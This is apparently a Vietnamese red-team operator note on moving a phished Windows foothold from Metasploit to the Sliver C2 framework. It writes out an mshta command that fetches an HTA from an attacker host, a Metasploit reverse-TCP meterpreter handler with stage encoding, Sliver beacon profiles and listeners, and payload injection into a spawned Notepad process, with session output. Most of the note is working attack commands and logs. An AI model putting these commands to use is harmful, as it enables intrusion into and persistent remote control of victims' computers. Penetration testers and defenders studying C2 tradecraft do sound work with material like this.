 **⚠️ Important:** You must have MinGW installed on your Sliver server to get some staged (e.g., Windows DLLs) payloads to work.
 
Vì kích thước của implant lớn (khoảng >= 15 MB), nên yêu cầu operator sử dụng [stagers](https://sliver.sh/docs?name=Stagers) để vận chuyển & thực thi implant trên máy nạn nhân.

Theo tài liệu, MSF hỗ trợ giao thức C2 là TCP và HTTP(S). Thông tin chi tiết xem thêm ở phần tham khảo.

## Chuyển từ Metasploit sang Sliver

Scenario: Attacker đã có foothold bằng phương pháp phishing email với tệp đính kèm chứa a Windows Shortcut file (LNK) độc hại. LNK này thực thi tệp HTA được lưu trữ trên máy kẻ tấn công, mô tả như sau:

```
C:\Windows\System32\mshta.exe https://IP_Attacker/Basic_Microsoft_HTML_Application_v1.hta
```

Attacker sử dụng metasploit làm C2 truy cập ban đầu

```bash
┌──(kali㉿kali)-[~]
└─$ msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST 10.10.108.30;set LPORT 443;set EnableStageEncoding true; set StageEncoder x64/xor ;set ExitOnSession false;exploit -jz"

[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
LHOST => 10.10.108.30
LPORT => 443
EnableStageEncoding => true
StageEncoder => x64/xor
ExitOnSession => false
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.108.30:443 
msf6 exploit(multi/handler) > [*] Encoded stage with x64/xor
[*] Sending encoded stage (201839 bytes) to 10.10.108.22
[*] Meterpreter session 1 opened (10.10.108.30:443 -> 10.10.108.22:50388) at 2024-08-22 03:30:05 -0400

msf6 exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                        Connection
  --  ----  ----                     -----------                        ----------
  1         meterpreter x64/windows  ATTT-PC-0003\Admin @ ATTT-PC-0003  10.10.108.30:443 -> 10.10.108.22:50388 (10.10.108.22)
```

#### Sliver preparation

![[Pasted image 20240822175232.png]]

Cần tạo 2 thứ là `profiles` và `stage-listener` , câu lệnh như sau:

```bash
sliver > profiles new beacon --mtls 10.10.108.30:8081 --format shellcode --seconds 5 --jitter 3 primary-payload
sliver > stage-listener -u tcp://10.10.108.30:8080 -p primary-payload --prepend-size
sliver > mtls -L 10.10.108.30 -l 8081
```

Kết quả câu lệnh

```bash
sliver > profiles new beacon --mtls 10.10.108.30:8081 --format shellcode --seconds 5 --jitter 3 primary-payload 

[*] Saved new implant profile (beacon) primary-payload

sliver > stage-listener -u tcp://10.10.108.30:8080 -p primary-payload --prepend-size

[*] Job 2 (tcp) started

sliver > mtls -L 10.10.108.30 -l 8081

[*] Starting mTLS listener ...
[*] Successfully started job #3

sliver > jobs

 ID   Name   Protocol   Port   Domains 
==== ====== ========== ====== =========          
 2    TCP    tcp        8080           
 3    mtls   tcp        8081 
```

#### Thực hiện chuyển
Tại Metasploit, sử dụng module local/payload_inject, đóng vai trò là stagers

```bash
msf6 exploit(multi/handler) > use windows/local/payload_inject
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/payload_inject) > set payload windows/x64/custom/reverse_tcp
payload => windows/x64/custom/reverse_tcp
msf6 exploit(windows/local/payload_inject) > set session 1
session => 1
msf6 exploit(windows/local/payload_inject) > set LHOST 10.10.108.30
LHOST => 10.10.108.30
msf6 exploit(windows/local/payload_inject) > set LPORT 8080
LPORT => 8080
msf6 exploit(windows/local/payload_inject) > run

[*] Running module against ATTT-PC-0003
[*] Spawned Notepad process 19188
[*] Injecting payload into 19188
[*] Preparing 'windows/x64/custom/reverse_tcp' for PID 19188
[*] Exploit completed, but no session was created.
```

![[Pasted image 20240822150928.png]]

Chuyển sang terminal Sliver, implant đã được thực thi và ta đã có thể sử dụng `beacon`

![[Pasted image 20240822175736.png]]

#### Hình ảnh liên quan

![[Pasted image 20240822180330.png]]

![[Pasted image 20240822180423.png]]

Reference:
- https://sliver.sh/docs?name=Stagers
- https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/local/payload_inject
- https://viblo.asia/p/cach-osepadvanced-evasion-techniques-and-breaching-defenses-lam-kho-toi-a-little-bit-EbNVQ5jWVvR

## Chuyển từ Sliver sang Metasploit

msf-inject -L 192.168.13.X -l 443 -m meterpreter/reverse_tcp




.